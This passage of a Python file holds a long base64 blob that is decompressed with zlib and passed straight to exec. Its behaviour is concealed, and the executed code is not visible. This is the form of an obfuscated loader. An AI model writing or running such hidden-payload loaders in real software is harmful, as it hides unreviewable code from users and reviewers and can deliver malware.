    "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"
)

exec(compile(
    _zlib.decompress(_b64.b64decode(_CORE_B64)),
    '<core_core>', 'exec'
))
